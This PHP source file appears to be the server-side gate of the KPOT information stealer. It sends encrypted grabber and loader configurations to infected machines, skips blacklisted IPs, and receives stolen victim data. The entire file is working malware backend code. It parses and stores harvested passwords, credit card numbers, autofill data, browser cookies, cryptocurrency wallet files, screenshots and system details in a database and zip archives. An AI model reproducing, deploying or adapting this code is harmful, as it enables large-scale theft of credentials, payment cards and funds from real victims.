<?php
require_once('global.php');
require_once('geoiploc.php');
$pwd_start = 'PWD: ';
$pwd_end = ' _PWD_';
$cc_start = 'CREDIT_CARD: ';
$cc_end = ' _CREDIT_CARD_';
$impautofill_start = 'IMPAUTOFILL_DATA: ';
$impautofill_end = ' _IMPAUTOFILL_DATA_';
$sysinfo_start = 'SYSINFORMATION: ';
$sysinfo_end = ' _SYSINFORMATION_';

function stealer_die()
{
	exit(base64_encode(rc4("quit", ENCRYPTION_KEY)));
}

$bot_ip = getClientIp();
$country = getCountryFromIP($bot_ip, ' NamE ');
$countryCode = getCountryFromIP($bot_ip, 'code');
$blackips = explode("\r\n", file_get_contents('config/blackip.txt'));
foreach ($blackips as $key => $value)
{
	$ip_range = explode('-', $value);
	if (count($ip_range) == 2)
	{
		$low_ip = ip2long($ip_range[0]);
		$high_ip = ip2long($ip_range[1]);
		$ip = ip2long($bot_ip);
		if ($ip >= $low_ip && $ip <= $high_ip) stealer_die();
	}
	else if ($bot_ip == $value) stealer_die();
}

$conn = mysqli_connect(DB_HOST, DB_USER, DB_PASS, DB_NAME) or die();

$panel_config = getConfig('panel');

if ($_SERVER['REQUEST_METHOD'] === 'GET')
{
    if ($panel_config['no_dubles'])
    {
        $query = sprintf("SELECT * from reports WHERE ip='%s'", mysqli_real_escape_string($conn, $bot_ip));
        if ($bot_reports = mysqli_query($conn, $query))
        {
            $rows_count = mysqli_num_rows($bot_reports);
            mysqli_free_result($bot_reports);
            if ($rows_count > 0) stealer_die();
        }
    }

    $bot_config = getConfig('bot');
    $client_ip = getClientIp();
    $config_str = '';
    foreach ($bot_config as $item) $config_str .= $item;
    $config_str .= "__DELIMM__{$client_ip}__DELIMM__";
    if ($grabber_res = mysqli_query($conn, 'SELECT * FROM filegrabber'))
    {
        while ($row = mysqli_fetch_object($grabber_res))
        {
			$flags = $row->all_users;
			$str_row = sprintf("%s__GRABBER__%s,__GRABBER__%s,__GRABBER__%s__GRABBER__%s;__GRABBER__%s__GRABBER__%s__GRABBER__%s__DELIMM__",
				$row->name, $row->mask, $row->exclude_mask, $row->path, $row->exclude_dirs, $row->min_size, $row->max_size, $flags);
            $config_str .= $str_row;
        }
        mysqli_free_result($grabber_res);
    }
    $config_str .= '__DELIMM__';

    if ($loader_res = mysqli_query($conn, 'SELECT * FROM loader'))
    {
        while ($row = mysqli_fetch_object($loader_res))
		{
			if (($row->countries == null || stristr($row->countries, $countryCode) || stristr($row->countries, $country)) &&
				($row->exclude_countries == null ||
				(!stristr($row->exclude_countries, $countryCode) && !stristr($row->exclude_countries, $country))))
			{
				$flags = $row->has_pwd.$row->has_history.$row->has_cookie.$row->has_crypto;
				$str_row = "{$row->link}__GRABBER__{$flags}__GRABBER__{$row->filter_links}__DELIMM__";
				$config_str .= $str_row;
			}
		}
        mysqli_free_result($loader_res);
    }
	$config_str .= '__DELIMM__';
    $encoded_res = base64_encode(rc4($config_str, ENCRYPTION_KEY));
    echo $encoded_res;
    exit();
}

if ($panel_config['no_dubles'])
{
	$query = sprintf("SELECT * from reports WHERE ip='%s'", mysqli_real_escape_string($conn, $bot_ip));
	if ($bot_reports = mysqli_query($conn, $query))
	{
		$rows_count = mysqli_num_rows($bot_reports);
		mysqli_free_result($bot_reports);
		if ($rows_count > 0) exit('OK');
	}
}

$report = XORCipher(file_get_contents('php://input'), ENCRYPTION_KEY);

$is_admin = ord($report[0]);
$il_index = ord($report[1]);
$os_version_id = ord($report[2]);

$countryCode1 = urldecode(trim(substr($report, 3, 16)));
$guid_start = substr($report, 19);
$guid = urldecode(trim(substr($guid_start, 0, 50)));
$windows_name = '';
$pc_name = '';
$user_name = '';
$btc_count = 0;
$grabber_count = 0;

function separateData($start, $end, &$counter = -1)
{
    $ret_str = '';
    foreach(explode($start, $GLOBALS['report']) as $item)
    {
        $res = explode($end, $item);
        if (count($res) == 2)
        {
            $ret_str = $ret_str.$res[0];
            if ($counter !== -1) ++$counter;
            if (substr($ret_str, -2) !== "\r\n") $ret_str .= "\r\n";
        }
    }
    return $ret_str;
}

// Main callback for processing files
function mainCallback($zipfile, $fileName, $fileData)
{
    $zipfile->addFromString($fileName, $fileData);
    if (strstr($fileName, 'Crypto/')) ++$GLOBALS['btc_count'];
    else if (strncmp($fileName, 'Grabber/', 8) == 0) ++$GLOBALS['grabber_count'];
}

// Callback for processing cookies files and saving screenshot.png
function cookiesCallback($zipfile, $fileName, $fileData)
{
    global $conn, $guid, $report_id;
    if (strstr($fileName, 'Cookies'))
    {
        $hosts = array();
        foreach (explode("\r\n", $fileData) as $cookie)
        {
            $host = explode("\t", $cookie)[0];
            if (strlen($host) < 260) ++$hosts[$host];
        }
        $query = 'INSERT INTO `cookies` (report_id, host, count) VALUES ';
        foreach($hosts as $host => $count) if ($host)
        {
            $query .= sprintf("('%s', '%s', '%s'),\r\n", mysqli_real_escape_string($conn, $report_id), mysqli_real_escape_string($conn, $host),
                mysqli_real_escape_string($conn, $count));
        }
        $query = substr($query, 0, -3);
        mysqlExecute($query);
    }
    else if ($fileName == 'screenshot.png') file_put_contents('screenshots/'.$report_id.'-'.$guid.'.png', $fileData);
}

function processFiles($zipfile, $callback)
{
    $file_start = 'FFFILEE: ';
    $file_end = ' _FFFILEE_';

    $ret_array = array();
    foreach(explode($file_start, $GLOBALS['report']) as $item)
    {
        $file_info = explode($file_end, $item);
        if (count($file_info) == 2)
        {
            $file_name = str_replace('\\', '/', strstr($file_info[0], "\r\n", true));
            $file_data = strstr($file_info[0], "\r\n");
            if (!$file_name || !$file_data) continue;

            call_user_func($callback, $zipfile, $file_name, substr($file_data, 2));
        }
    }
    return $ret_array;
}

function addCreditCards($str, $report_id)
{
	global $conn, $passwords;
	$query = 'INSERT INTO `credit_cards` (rep_id, guid, card_number, exp_date, holder_name, network, bank_name) VALUES ';
	foreach(explode("\r\n", $str) as $item)
	{
		$data = explode('|', $item);
		if (count($data) != 6 && count($data) != 5) continue;
		$type = $data[0];
		$guid = '';
		$card_number = '';
		$exp_date = '';
		$holder_name = '';
		$network = '';
		$bank_name = '';
		if ($type === 'Masked')
		{
			$card_number = mysqli_real_escape_string($conn, $data[1]);
			$exp_date = mysqli_real_escape_string($conn, $data[2]);
			$holder_name = mysqli_real_escape_string($conn, $data[3]);
			$network = mysqli_real_escape_string($conn, $data[4]);
			$bank_name = mysqli_real_escape_string($conn, $data[5]);
		}
		else if ($type == 'Normal')
		{
			$guid = mysqli_real_escape_string($conn, $data[1]);
			$card_number = mysqli_real_escape_string($conn, $data[2]);
			$exp_date = mysqli_real_escape_string($conn, $data[3]);
			$holder_name = mysqli_real_escape_string($conn, $data[4]);
		}
		else continue;
		$query .= sprintf("(%d, '%s', '%s', '%s', '%s', '%s', '%s'),\r\n",
			$report_id, $guid, $card_number, $exp_date, $holder_name, $network, $bank_name);
	}
	$query = substr($query, 0, -3);
	mysqlExecute($query);
}

function addPasswords($str, $report_id)
{
    global $conn, $passwords;
	$passwords_count = 0;
    $i = 0;
    $new_passwords = '';
    $insert_limit = 999;
    $query_start = 'INSERT INTO `passwords` (report_id, soft_type, soft_name, host, user, password) VALUES ';
    $query = $query_start;
    $items = explode("\r\n", $str);
    foreach($items as $item)
    {
        $data = explode('|', $item);
        if (count($data) != 6) continue;
        $soft_type = mysqli_real_escape_string($conn, $data[0]);
        $soft_name = mysqli_real_escape_string($conn, $data[1]);
        $host = mysqli_real_escape_string($conn, $data[2]);
        $user = mysqli_real_escape_string($conn, $data[3]);
        $password = mysqli_real_escape_string($conn, $data[4]);
		$profile = mysqli_real_escape_string($conn, $data[5]);
        $query .= sprintf("(%d, '%s', '%s', '%s', '%s', '%s'),\r\n", $report_id,
            $soft_type, $soft_name, $host, $user, $password);
        $new_passwords .= sprintf("%s\r\n%s\r\n%s\t%s\r\n%s\r\n\r\n", $soft_name, $host, $user, $password, $profile);
        ++$i;
        if ($i >= $insert_limit)
        {
            $query = substr($query, 0, -3);
            mysqlExecute($query);
            $i = 0;
            $query = $query_start;
        }
		++$passwords_count;
    }
    if ($i > 0)
    {
        $query = substr($query, 0, -3);
        mysqlExecute($query);
    }
    $passwords = $new_passwords;
	return $passwords_count;
}

$cc_count = 0;

// zipName: KPOT-(countryCode_by_ip-countryCode_by_os)-[date]-guid.zip
$zipName = sprintf('KPOT-(%s_%s)-[%s]-%s.zip', $countryCode, $countryCode1, date('H-i-s d-m-Y'), $guid);
$res_archive = new ZipArchive;
$res_archive->open('files/'.$zipName, ZipArchive::CREATE);
$passwords = separateData($pwd_start, $pwd_end);
$impautofill = separateData($impautofill_start, $impautofill_end);
$cred_cards = separateData($cc_start, $cc_end, $cc_count);
if ($impautofill) $res_archive->addFromString('important_autofill.txt', $impautofill);
if ($sysinfo = separateData($sysinfo_start, $sysinfo_end))
{
    $windows_name = explode("\r\n", $sysinfo)[0];
    $pc_name = explode('PC: ', $sysinfo)[1];
    $pc_name = explode("\r\n", $pc_name)[0];
    $user_name = explode('User: ', $sysinfo)[1];
    $user_name = explode("\r\n", $user_name)[0];
    $res_archive->addFromString('sysInfo.txt', $sysinfo);
}
processFiles($res_archive, 'mainCallback');

$timestamp = time();

$query = sprintf(
    "INSERT INTO `reports` (os_version, os_name, guid, ip, admin, il, timestamp, country_code, country, pcname, username, btc_count, cc_count, pwd_count, files_count, zipname)
     VALUES (%d, '%s', '%s', '%s', %d, %d, %d, '%s', '%s', '%s', '%s', %d, %d, %d, %d, '%s')",
    $os_version_id, mysqli_real_escape_string($conn, $windows_name), mysqli_real_escape_string($conn, $guid),
    mysqli_real_escape_string($conn, $bot_ip), $is_admin, $il_index, $timestamp,
    mysqli_real_escape_string($conn, $countryCode), mysqli_real_escape_string($conn, $country), mysqli_real_escape_string($conn, $pc_name),
    mysqli_real_escape_string($conn, $user_name), mysqli_real_escape_string($conn, $btc_count), $cc_count, 0, $grabber_count, $zipName);
mysqli_query($conn, $query);

$report_id = mysqli_insert_id($conn);
$passwords_count = 0;
if ($passwords)
{
    $passwords_count = addPasswords($passwords, $report_id);
    $res_archive->addFromString('passwords.txt', $passwords);
}
if ($cred_cards)
{
	addCreditCards($cred_cards, $report_id);
	$res_archive->addFromString('cc.txt', $cred_cards);
}
processFiles($res_archive, 'cookiesCallback');
mysqli_close($conn);
$res_archive->close();

$zipName2 = $report_id.'-'.$zipName;
$query = sprintf("UPDATE `reports` SET reports.pwd_count=%d, reports.zipname='%s' WHERE reports.rep_id=%d",
	$passwords_count, $zipName2, $report_id);
mysqlExecute($query);
@rename('files/'.$zipName, 'files/'.$zipName2);

exit('OK');
?>